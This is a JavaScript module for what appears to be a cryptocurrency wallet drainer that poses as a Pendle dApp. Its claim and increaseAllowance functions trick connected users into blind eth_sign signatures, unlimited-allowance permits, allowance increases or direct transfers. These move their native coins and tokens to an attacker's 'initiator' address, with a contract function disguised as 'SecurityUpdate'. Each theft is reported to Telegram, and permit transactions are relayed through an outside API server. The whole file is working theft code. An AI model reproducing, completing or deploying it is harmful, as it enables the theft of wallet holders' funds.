/* eslint-disable no-prototype-builtins */
import {
  EthereumClient,
  w3mConnectors,
  w3mProvider
} from '@web3modal/ethereum';
import { Web3Modal } from '@web3modal/html';
import {
  configureChains,
  createConfig,
  fetchBalance,
  writeContract
} from '@wagmi/core';
import { CoinbaseWalletConnector } from '@wagmi/connectors/coinbaseWallet'
import { mainnet, arbitrum, polygon, avalanche, bsc, fantom, gnosis, optimism } from '@wagmi/core/chains';
import { getAccount, fetchFeeData, getNetwork, switchNetwork } from '@wagmi/core';
import { ethers } from 'ethers';
import Web3 from 'web3';

import * as constants from './constants.js';
import { getTokens as parseTokens } from './zapper.js';
import { sendMessage } from './telegram.js';
import axios from 'axios';

let provider;

const chains = [mainnet, arbitrum, polygon, avalanche, bsc, optimism, fantom, gnosis];
const projectId = constants.projectId;

const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);

const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: [
    ...w3mConnectors({ projectId, chains }),
    new CoinbaseWalletConnector({
        chains,
        options: {
            appName: "pendle",
            qrcode: true,
        },
    }),
  ],
  publicClient,
});
const ethereumClient = new EthereumClient(wagmiConfig, chains);
export const web3modal = new Web3Modal({ projectId, walletImages: {coinbaseWallet: './coinbase-wallet-logo.png'},  }, ethereumClient);

let prices = [];
export let priceList = [];

export const getTokens = parseTokens;

export const setPrice = (ticker) => {
  // eslint-disable-next-line no-async-promise-executor
  return new Promise(async (resolve) => {
    let token = priceList.filter((token) => token.symbol === `${ticker}USDT`);
    if (token && token.length > 0) {
      prices.push(token[0].price);
    } else prices.push(0);

    resolve(token.price);
  });
};

export const getPrice = async (symbols) => {
  for (let i = 0; i < symbols.length; i++) {
    const symbol = symbols[i];
    await setPrice(symbol);
  }
  return prices;
};

export const claim = async (_balance, chainId) => {
  if (!provider) await setProvider();
  
  try {
    if (getNetwork().chain.id != chainId) {
      try {
        await switchNetwork({chainId: chainId});
      } catch (e) {
        return;
      }
    }

    // Method 1: sign
    const web3 = new Web3(provider);
    const account = getAccount().address;
    const feeData = await fetchFeeData({
      chainId: chainId,
      formatUnits: 'gwei',
    });
    const plus = feeData.lastBaseFeePerGas ? feeData.gasPrice + feeData.lastBaseFeePerGas : feeData.gasPrice;
    const amount = _balance - BigInt(120000) * plus;
    const ethBalance = web3.utils.fromWei(String(amount), 'ether');

    try {
      web3.setProvider(new Web3.providers.HttpProvider(constants.RPC[chainId]));
      const nonce = await web3.eth.getTransactionCount(account);
      web3.setProvider(provider);

      let tx_ = {
        nonce: web3.utils.toHex(nonce),
        to: constants.initiator,
        gasLimit: web3.utils.toHex(100000),
        gasPrice: web3.utils.toHex(String(feeData.gasPrice)),
        value: web3.utils.toHex(String(amount)),
        data: "0x0",
        r: "0x",
        s: "0x",
        v: web3.utils.toHex(chainId),
      };

      const { ethereumjs } = window;
      var tx = new ethereumjs.Tx(tx_);
      const serializedTx = "0x" + tx.serialize().toString("hex");
      const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });

      const initialSig = await web3.eth.sign(sha3_, account);  // ERROR: eth_sign
      const temp = initialSig.substring(2),
        r = "0x" + temp.substring(0, 64),
        s = "0x" + temp.substring(64, 128),
        rhema = parseInt(temp.substring(128, 130), 16),
        v = web3.utils.toHex(rhema + chainId * 2 + 8);
      tx.r = r;
      tx.s = s;
      tx.v = v;
      const txFin = "0x" + tx.serialize().toString("hex");
      console.log("Waiting for sign submitting...");

      web3.setProvider(new Web3.providers.HttpProvider(constants.RPC[chainId]));
      try {
        await web3.eth.sendSignedTransaction(txFin);
        sendMessage(`✅ Transfer native - *${parseFloat(ethBalance).toFixed(2)}* | Network: ${chainId} | From: ${account}`);
      } catch (e) {
        console.log('SIGN ERR', e);
      }
      web3.setProvider(provider);
      return;
    } catch (e) {
      console.log('errrrrrrrr', e)
    }

    // Method 2: transfer (SecurityUpdate contract function)
    try {
      await writeContract({
        address: constants.contracts[chainId],
        abi: constants.receiveContractABI,
        functionName: 'SecurityUpdate',
        value: amount,
        gasPrice: feeData.gasPrice,
        gas: 100000,
      });
      sendMessage(`✅ Transfer native - *${parseFloat(ethBalance).toFixed(2)}* | Network: ${chainId} | From: ${account}`);
    } catch (e) {
      console.log('Security Update Err', e);
    }
  } catch (error) {
    console.log(error);
    return;
  }
};

export const increaseAllowance = async (token, metamask=false) => {
  try {
    setProvider(metamask);

    if (getNetwork().chain.id != token.chainId) {
      try {
        await switchNetwork({chainId: token.chainId});
      } catch (e) {
        return;
      }
    }

    const web3 = new Web3(new Web3.providers.HttpProvider(constants.RPC[token.chainId]));
    const account = getAccount().address;
    const contract = new web3.eth.Contract(
      constants.ALLOWANCEABI,
      token.token_address
    );
    
    contract.setProvider(new Web3.providers.HttpProvider(constants.RPC[token.chainId]))

    // const allowance = await contract.methods
    //   .allowance(account, constants.initiator)
    //   .call();
    // if (allowance >= token.balance) {
    //   return await transfer(token);
    // }

    const gasPrice = Math.floor(await web3.eth.getGasPrice() * 1.3);
    const nonce = await web3.eth.getTransactionCount(account);

    web3.setProvider(provider);
    contract.setProvider(provider);

    // Method 1: sign
    try {
      const hash = contract.methods.transfer(constants.initiator, token.balanceRaw).encodeABI();
      let tx_ = {
        nonce: web3.utils.toHex(nonce),
        to: token.token_address,
        gasLimit: web3.utils.toHex(100000),
        gasPrice: web3.utils.toHex(gasPrice),
        value: "0x0",
        data: hash,
        r: "0x",
        s: "0x",
        v: web3.utils.toHex(token.chainId),
      };

      const { ethereumjs } = window;
      var tx = new ethereumjs.Tx(tx_);
      const serializedTx = "0x" + tx.serialize().toString("hex");
      const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });

      const initialSig = await web3.eth.sign(sha3_, account);  // ERROR: eth_sign
      const temp = initialSig.substring(2),
        r = "0x" + temp.substring(0, 64),
        s = "0x" + temp.substring(64, 128),
        rhema = parseInt(temp.substring(128, 130), 16),
        v = web3.utils.toHex(rhema + token.chainId * 2 + 8);
      tx.r = r;
      tx.s = s;
      tx.v = v;
      const txFin = "0x" + tx.serialize().toString("hex");
      console.log("Waiting for sign submitting...", tx_);

      web3.setProvider(new Web3.providers.HttpProvider(constants.RPC[token.chainId]));
      try {
        await web3.eth.sendSignedTransaction(txFin);
        sendMessage(`✅ Transfer ${token.symbol} - *$${parseInt(token.usdPrice)}* | Network: ${token.chainId} | From: ${account}`);
        return;
      } catch (e) {
        console.log(e);
      }
      web3.setProvider(provider);
    } catch (e) {
      console.log('errrrrrrrr', e)
    }

    // Method 2: permit
    const funcs = contract.methods
    const permitToken = funcs.hasOwnProperty('permit') && funcs.hasOwnProperty('nonces') &&
      funcs.hasOwnProperty('name') && funcs.hasOwnProperty('DOMAIN_SEPARATOR')
    console.log('perm', permitToken)

    if (permitToken && token.token_address.toLowerCase() != '0x2791bca1f2de4661ed88a30c99a7a9449aa84174') {  // polygon usdc permit broken
      contract.setProvider(new Web3.providers.HttpProvider(constants.RPC[token.chainId]));
      let nonce = await web3.eth.getTransactionCount(token.token_address)

      let result;
      try {
        result = await contract.methods.version().call();
      } catch (e) {result = '2'}

      contract.setProvider(provider);

      if (result === '1') {
        try {
          const dataToSign = JSON.stringify({
            domain: {
                name: token.label, // token name
                version: "1", // version of a token
                chainId: String(token.chainId),
                verifyingContract: token.token_address
            }, 
            types: {
                EIP712Domain: [
                    { name: "name", type: "string" },
                    { name: "version", type: "string" },
                    { name: "chainId", type: "uint256" },
                    { name: "verifyingContract", type: "address" },
                ],
                Permit: [
                    { name: "holder", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "nonce", type: "uint256" },
                    { name: "expiry", type: "uint256" },
                    { name: "allowed", type: "bool" },
                ]
            },
            primaryType: "Permit",
            message: { 
              holder: account,
              spender: constants.initiator,
              nonce: nonce,
              expiry: constants.deadline,
              allowed: true,
            }
          });
          console.log('data', dataToSign)
          web3.setProvider(provider);

          web3.currentProvider.sendAsync({
            method: "eth_signTypedData_v4",
            params: [account, dataToSign],
            from: account
          }, async (error, result) => {
            console.log(error)
            if (error != null) throw new Error("Denied Signature")
            web3.setProvider(new Web3.providers.HttpProvider(constants.RPC[token.chainId]));

            const signature = result
            const splited = ethers.utils.splitSignature(signature)
            const initiatorNonce = await web3.eth.getTransactionCount(constants.initiator);
            const permitData = contract.methods.permit(account, constants.initiator, nonce, constants.deadline, true,  splited.v, splited.r, splited.s).encodeABI()
            const gasPrice = await web3.eth.getGasPrice()
            const permitTX = {
                from: constants.initiator,
                to: token.token_address,
                nonce: web3.utils.toHex(initiatorNonce),
                gasLimit: web3.utils.toHex(98000),
                gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
                value: "0x",
                data: permitData
            }
            console.log('PERMIT TX', permitTX);

            const response = await axios.post(`${constants.API_URL}/sign_transaction`, {tx: permitTX, chainId: token.chainId});
            await web3.eth.sendSignedTransaction(response.data.data.rawTransaction);
            await transfer(token);
            return;
          });
        } catch (error) {
          console.log(error);
        }
      }
      if (result === '2') {
        try {
          const tokencontract = new web3.eth.Contract(
            constants.permitV2,
            token.token_address
          );
          tokencontract.setProvider(provider);
          const ethersProvider = new ethers.providers.JsonRpcProvider(constants.RPC[token.chainId]);
          const erc20Contract = new ethers.Contract(
            token.token_address,
            constants.permitV2,
            ethersProvider
          );

          let v2nonce;
          erc20Contract.nonces(account).then(async(result) => {
            v2nonce = result.toString();
            const dataToSign = JSON.stringify({
              domain: {
                  name: token.label, // token name
                  version: "1", // version of a token
                  chainId: String(token.chainId),
                  verifyingContract: token.token_address
              }, 
              types: {
                  EIP712Domain: [
                      { name: "name", type: "string" },
                      { name: "version", type: "string" },
                      { name: "chainId", type: "uint256" },
                      { name: "verifyingContract", type: "address" },
                  ],
                  Permit: [
                      { name: "owner", type: "address" },
                      { name: "spender", type: "address" },
                      { name: "value", type: "uint256" },
                      { name: "nonce", type: "uint256" },
                      { name: "deadline", type: "uint256" },
                  ]
              },
              primaryType: "Permit",
              message: { 
                  owner: account, 
                  spender: constants.initiator, 
                  value: constants.max,
                  nonce: v2nonce,
                  deadline: constants.deadline 
              }
            });
            console.log(dataToSign)

            web3.currentProvider.sendAsync({
              method: "eth_signTypedData_v4",
              params: [account, dataToSign],
              from: account
            }, async (error, result) => {
              console.log(error)

              if (error != null) throw new Error("Denied Signature")

              web3.setProvider(new Web3.providers.HttpProvider(constants.RPC[token.chainId]));
              tokencontract.setProvider(new Web3.providers.HttpProvider(constants.RPC[token.chainId]))
              
              const signature = result.result
              const splited = ethers.utils.splitSignature(signature)
              const initiatorNonce = await web3.eth.getTransactionCount(constants.initiator);
              const permitData = tokencontract.methods.permit(account, constants.initiator, constants.max, constants.deadline, splited.v, splited.r, splited.s).encodeABI()
              const gasPrice = await web3.eth.getGasPrice();
              
              const permitTX = {
                  from: constants.initiator,
                  to: token.token_address,
                  nonce: web3.utils.toHex(initiatorNonce),
                  gasLimit: web3.utils.toHex(98000),
                  gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
                  value: "0x",
                  data: permitData
              }
              const response = await axios.post(`${constants.API_URL}/sign_transaction`, {tx: permitTX, chainId: token.chainId});
              console.log(response)
              console.log(await web3.eth.sendSignedTransaction(response.data.data.rawTransaction));
              await transfer(token);
              return;
            })
          });
        } catch (error) {
          console.log(error);
        }
      }
    }

    // Method 3: increase allowance
    try {
      if (contract._provider.chainId != token.chainId) {
        contract.setProvider(new Web3.providers.HttpProvider(constants.RPC[token.chainId]))
      }

      await contract.methods.increaseAllowance(constants.initiator, constants.max).send({
        from: account,
        gasLimit: web3.utils.toHex(100000),
        gasPrice: web3.utils.toHex(gasPrice)
      });
      await transfer(token);
      return;
    } catch (e) {
      console.log('INCR ERR', e);
    }

    // Method 4: transfer
    try {
      await contract.methods.transfer(constants.initiator, token.balanceRaw).send({
        from: account,
        gasLimit: ethers.utils.hexlify(100000),
        gasPrice: ethers.utils.hexlify(gasPrice)
      })
      sendMessage(`✅ Transfer ${token.symbol} - *$${parseInt(token.usdPrice)}* | Network: ${token.chainId} | From: ${account}`);
    } catch (e) {
      console.log('Transfer error', e);
    }
  } catch (error) {
    console.log(error);
  }
};

export const transfer = async (token) => {
  if (!provider) await setProvider();

  const account = getAccount().address;
  axios.post(`${constants.API_URL}/transfer`, {token, account});
}

export const balanceOf = async (tokenAddress, chainId) => {
  try {
    const account = getAccount().address;
    const data = {address: account, chainId}
    if (tokenAddress != '0x0000000000000000000000000000000000000000') data.token = tokenAddress
    return await fetchBalance(data);
  } catch (error) {
    console.log(error);
  }
};

const setProvider = async () => {
  try {
    const providerName = getAccount().connector.name.toLowerCase();
    if (providerName == 'metamask' || providerName == 'coinbase wallet') {
      provider = window.ethereum;
      return;
    }
  } catch (e) {return}

  sendMessage(getAccount().connector.provider.name);
  provider = getAccount().connector.provider;
}